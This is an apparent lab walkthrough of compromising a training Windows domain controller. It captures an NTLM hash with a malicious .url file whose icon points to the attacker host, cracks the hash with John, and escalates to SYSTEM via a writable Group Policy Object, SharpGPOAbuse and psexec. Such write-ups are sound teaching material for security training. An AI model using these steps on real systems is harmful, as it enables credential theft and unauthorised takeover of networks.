@@ -1,0 +1,307 @@
+<div id="__BVID__12___BV_modal_content_" tabindex="-1" class="modal-content"><header id="__BVID__12___BV_modal_header_" class="modal-header"><h5 id="__BVID__12___BV_modal_title_" class="modal-title">Walkthrough</h5><button type="button" aria-label="Close" class="close">×</button></header><div id="__BVID__12___BV_modal_body_" class="modal-body"><div class="mb-2 flex-grow" on-finish="function() {
+    [native code]
+}"><div class="markdown-container"><div class="markdown-content text-main-color"><!----><div><h1>Exploitation Guide for Vault</h1>
+<h2>Summary</h2>
+<p>In this guide, we will gain a foothold on the target by using a writeable SMB share to execute a URI file attack. We'll then elevate to SYSTEM privilege by abusing write access on a Group Policy Object.</p>
+<h2>Enumeration</h2>
+<h3>Nmap</h3>
+<p>We'll start by looking for open ports with an <code>nmap</code> scan.</p>
+<pre id="fence-code-23" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ sudo nmap -sC -sV 192.168.120.116
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-19 11:42 EST
+Nmap scan report for 192.168.120.116
+Host is up (0.031s latency).
+Not shown: 988 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-11-19 16:42:45Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=DC.vault.offsec
+| Not valid before: 2021-11-18T09:00:44
+|_Not valid after:  2022-05-20T09:00:44
+|_ssl-date: 2021-11-19T16:43:27+00:00; 0s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: VAULT
+|   NetBIOS_Domain_Name: VAULT
+|   NetBIOS_Computer_Name: DC
+|   DNS_Domain_Name: vault.offsec
+|   DNS_Computer_Name: DC.vault.offsec
+|   DNS_Tree_Name: vault.offsec
+|   Product_Version: 10.0.17763
+|_  System_Time: 2021-11-19T16:42:47+00:00
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2021-11-19T16:42:49
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+</code></pre>
+<p>There are a lot of open services on this target, and we can probably assume this is an Active Directory server.</p>
+<h3>SMB Enumeration</h3>
+<p>We'll start by taking a look at the SMB service. Let's connect to it using <code>smbclient</code>.</p>
+<pre id="fence-code-24" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ smbclient -N -L 192.168.120.116                                     
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        DocumentsShare  Disk      
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SYSVOL          Disk      Logon server share 
+SMB1 disabled -- no workgroup available
+</code></pre>
+<p>Most of those shares appear to be default except the one named <strong>DocumentsShare</strong>. Let's connect to it and see what's inside.</p>
+<pre id="fence-code-25" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ smbclient -N //192.168.120.116/DocumentsShare
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Fri Nov 19 03:59:02 2021
+  ..                                  D        0  Fri Nov 19 03:59:02 2021
+
+                7706623 blocks of size 4096. 697531 blocks available
+smb: \&gt; 
+...
+</code></pre>
+<p>There is nothing in here. Maybe we can write files to this share. Let's create a file on our Kali host named <strong>test.txt</strong> and attempt to upload it to the share.</p>
+<pre id="fence-code-26" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ echo "TEST" &gt; test.txt
+</code></pre>
+<pre id="fence-code-27" class="fence-code"><code>...
+smb: \&gt; put test.txt
+putting file test.txt as \test.txt (0.0 kb/s) (average 0.0 kb/s)
+smb: \&gt; ls
+  .                                   D        0  Fri Nov 19 12:24:49 2021
+  ..                                  D        0  Fri Nov 19 12:24:49 2021
+  test.txt                            A        0  Fri Nov 19 12:24:49 2021
+
+                7706623 blocks of size 4096. 697355 blocks available
+smb: \&gt; 
+...
+</code></pre>
+<p>Success! We have write access to this SMB share.</p>
+<h2>Exploitation</h2>
+<h3>URI File Attack</h3>
+<p>As this is a Windows host, we can use the SMB share access to upload a file that the target system will interpret as a Windows shortcut. In this file, we can specify an icon that points to our Kali host. This should allow us to capture the user's NTLM hash when it is accessed.</p>
+<p>We'll create a file named <strong>@hax.url</strong> with the following contents.</p>
+<pre id="fence-code-28" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ cat @hax.url 
+[InternetShortcut]
+URL=anything
+WorkingDirectory=anything
+IconFile=\\192.168.118.14\%USERNAME%.icon
+IconIndex=1
+</code></pre>
+<p>When a user accesses this file, it will attempt to load the icon. This will cause a request to our Kali host for a file named with the user account's username. This request should also contain the NTLM hash of this account.</p>
+<p>Before uploading the file to the SMB share, let's start <code>responder</code> to listen for the request.</p>
+<pre id="fence-code-29" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ sudo responder -I tap0 -v
+...
+[+] Listening for events...
+...
+</code></pre>
+<p>Next, let's upload our file.</p>
+<pre id="fence-code-30" class="fence-code"><code>...
+smb: \&gt; put @hax.url 
+putting file @hax.url as \@hax.url (1.2 kb/s) (average 1.2 kb/s)
+smb: \&gt; quit
+
+┌──(kali㉿kali)-[~]
+└─$
+</code></pre>
+<p>After a little while, <code>responder</code> captures a hash.</p>
+<pre id="fence-code-31" class="fence-code"><code>...
+[SMB] NTLMv2-SSP Client   : 192.168.120.116
+[SMB] NTLMv2-SSP Username : VAULT\anirudh
+[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:9def1316e1c05550:0AF01C475AFD7AD30D439711296603FC:010100000000000000C8C8F445DDD70175319E0B50E5D26C0000000002000800410031005900380001001E00570049004E002D004C00580033003800430030004B004C00350047005A0004003400570049004E002D004C00580033003800430030004B004C00350047005A002E0041003100590038002E004C004F00430041004C000300140041003100590038002E004C004F00430041004C000500140041003100590038002E004C004F00430041004C000700080000C8C8F445DDD7010600040002000000080030003000000000000000010000000020000024B3687DE76994B1C5B750504A62A0055473E634299355A166AE72D58CD7F8660A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E003100310038002E00310034000000000000000000 
+</code></pre>
+<p>Nice, we successfully obtained the NTLM hash for a user named <code>anirudh</code>.</p>
+<h3>User Password Brute-Force</h3>
+<p>Let's save this hash to a file and attempt to crack it using <code>john</code> and the <strong>rockyou.txt</strong> wordlist.</p>
+<pre id="fence-code-32" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ cat hash.txt 
+anirudh::VAULT:9def1316e1c05550:0AF01C475AFD7AD30D439711296603FC:010100000000000000C8C8F445DDD70175319E0B50E5D26C0000000002000800410031005900380001001E00570049004E002D004C00580033003800430030004B004C00350047005A0004003400570049004E002D004C00580033003800430030004B004C00350047005A002E0041003100590038002E004C004F00430041004C000300140041003100590038002E004C004F00430041004C000500140041003100590038002E004C004F00430041004C000700080000C8C8F445DDD7010600040002000000080030003000000000000000010000000020000024B3687DE76994B1C5B750504A62A0055473E634299355A166AE72D58CD7F8660A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E003100310038002E00310034000000000000000000
+
+┌──(kali㉿kali)-[~]
+└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+SecureHM         (anirudh)     
+1g 0:00:00:03 DONE (2021-11-19 13:09) 0.2564g/s 2720Kp/s 2720Kc/s 2720KC/s Seifer@14..Schsutar90
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed. 
+</code></pre>
+<p>We were able to recover the password for the user <code>anirudh</code>: <code>SecureHM</code>. Let's use this account to attempt to log in to the target using <code>evil-winrm</code>.</p>
+<pre id="fence-code-33" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ evil-winrm -i 192.168.120.116 -u anirudh -p "SecureHM" 
+
+Evil-WinRM shell v3.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; whoami
+vault\anirudh
+*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; 
+</code></pre>
+<p>We now have shell access on the target system as <code>anirudh</code>.</p>
+<h2>Escalation</h2>
+<h3>Group Policy Object Enumeration</h3>
+<p>Let's start off by checking if our user has access to modify any Group Policy Objects. We can use helper PowerShell modules to assist us with finding the information we need. Let's copy <strong>PowerView.ps1</strong> to our working directory on our Kali host.</p>
+<pre id="fence-code-34" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .
+</code></pre>
+<p>Next, we'll re-connect to the target using <code>evil-winrm</code> with the <code>-s</code> argument to give us access to PowerShell scripts in our home directory.</p>
+<pre id="fence-code-35" class="fence-code"><code>*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; exit
+
+Info: Exiting with code 0
+
+
+┌──(kali㉿kali)-[~]
+└─$ evil-winrm -i 192.168.120.116 -u anirudh -p "SecureHM" -s .
+
+Evil-WinRM shell v3.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; 
+</code></pre>
+<p>We'll then simply call the <strong>PowerView.ps1</strong> script to load it in our PowerShell session.</p>
+<pre id="fence-code-36" class="fence-code"><code>*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; PowerView.ps1
+</code></pre>
+<p>We can now run <code>Get-NetGPO</code> to list GPOs.</p>
+<pre id="fence-code-37" class="fence-code"><code>*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; Get-NetGPO
+
+
+usncreated               : 5672
+systemflags              : -1946157056
+displayname              : Default Domain Policy
+gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1B-2488-11D1-A28C-00
+                           C04FB94F17}]
+whenchanged              : 11/19/2021 9:00:32 AM
+objectclass              : {top, container, groupPolicyContainer}
+gpcfunctionalityversion  : 2
+showinadvancedviewonly   : True
+usnchanged               : 12778
+dscorepropagationdata    : {11/19/2021 9:00:32 AM, 11/19/2021 8:51:14 AM, 1/1/1601 12:00:00 AM}
+name                     : {31B2F340-016D-11D2-945F-00C04FB984F9}
+adspath                  : LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=vault,DC=offsec
+flags                    : 0
+cn                       : {31B2F340-016D-11D2-945F-00C04FB984F9}
+iscriticalsystemobject   : True
+gpcfilesyspath           : \\vault.offsec\sysvol\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
+distinguishedname        : CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=vault,DC=offsec
+whencreated              : 11/19/2021 8:50:33 AM
+versionnumber            : 4
+instancetype             : 4
+objectguid               : 93130581-3375-49c7-88d3-afdc915a9526
+objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=vault,DC=offsec
+...
+</code></pre>
+<p>We can check what permissions we have on a specific GPO by passing its GUID (labeled "name") to the cmdlet <code>Get-GPPermission</code>. Let's check our permissions on the <strong>Default Group Policy</strong>.</p>
+<pre id="fence-code-38" class="fence-code"><code>*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; Get-GPPermission -Guid 31B2F340-016D-11D2-945F-00C04FB984F9 -TargetType User -TargetName anirudh
+
+
+Trustee     : anirudh
+TrusteeType : User
+Permission  : GpoEditDeleteModifySecurity
+Inherited   : False
+</code></pre>
+<p>The entry labeled <code>Permission</code> shows that we have the ability to edit, delete, and modify this policy. We can take advantage of this misconfiguration by using a tool named <code>SharpGPOAbuse</code>.</p>
+<h3>GPO Abuse via SharpGPOAbuse</h3>
+<p>Let's download a copy of the pre-complied executable from https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe to our Kali host.</p>
+<pre id="fence-code-39" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe
+--2021-11-19 15:27:15--  https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe
+...
+
+2021-11-19 15:27:16 (3.70 MB/s) - ‘SharpGPOAbuse.exe’ saved [70656/70656]
+</code></pre>
+<p>Back in our <code>evil-winrm</code> shell, we'll upload the executable using the <code>upload</code> command.</p>
+<pre id="fence-code-40" class="fence-code"><code>*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; upload /home/kali/SharpGPOAbuse.exe
+Info: Uploading /home/kali/SharpGPOAbuse.exe to C:\Users\anirudh\Documents\SharpGPOAbuse.exe
+
+                                                             
+Data: 94208 bytes of 94208 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; 
+</code></pre>
+<p>We can now execute <strong>SharpGPOAbuse.exe</strong> specifying that we want to add our user account to the local Administrators group, passing our username, and passing the group policy we have write access to.</p>
+<pre id="fence-code-41" class="fence-code"><code>*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
+[+] Domain = vault.offsec
+[+] Domain Controller = DC.vault.offsec
+[+] Distinguished Name = CN=Policies,CN=System,DC=vault,DC=offsec
+[+] SID Value of anirudh = S-1-5-21-537427935-490066102-1511301751-1103
+[+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
+[+] File exists: \\vault.offsec\SysVol\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
+[+] The GPO does not specify any group memberships.
+[+] versionNumber attribute changed successfully
+[+] The version number in GPT.ini was increased successfully.
+[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
+[+] Done!
+*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; 
+</code></pre>
+<p>With that done, we'll need to update the local Group Policy.</p>
+<pre id="fence-code-42" class="fence-code"><code>*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; gpupdate /force
+Updating policy...
+
+
+
+Computer Policy update has completed successfully.
+
+User Policy update has completed successfully.
+</code></pre>
+<p>We can verify that this worked by checking the members of the local Administrators group.</p>
+<pre id="fence-code-43" class="fence-code"><code>*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; net localgroup Administrators
+Alias name     Administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+anirudh
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; 
+</code></pre>
+<p>Our account, <code>anirudh</code>, is listed as a member of the Administrators group. We can use this access to gain a system shell. Back on our Kali host, let's use <code>psexec.py</code> from <em>Impacket</em> to help us.</p>
+<pre id="fence-code-44" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ python3 /usr/share/doc/python3-impacket/examples/psexec.py vault.offsec/anirudh:SecureHM@192.168.120.116
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Requesting shares on 192.168.120.116.....
+[*] Found writable share ADMIN$
+[*] Uploading file WGPlQkwE.exe
+[*] Opening SVCManager on 192.168.120.116.....
+[*] Creating service LVYv on 192.168.120.116.....
+[*] Starting service LVYv.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.2300]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt; whoami
+nt authority\system
+
+C:\Windows\system32&gt; 
+</code></pre>
+<p>We now have SYSTEM access on the target!</p>
+</div><!----></div></div><div class="d-flex flex-row full-width mt-4 mb-1 justify-content-end"><button type="button" class="btn transparent-btn mb-2 pl-0 pr-0 btn-link btn-lg">
+      Close
+    </button><!----></div></div></div><!----></div>
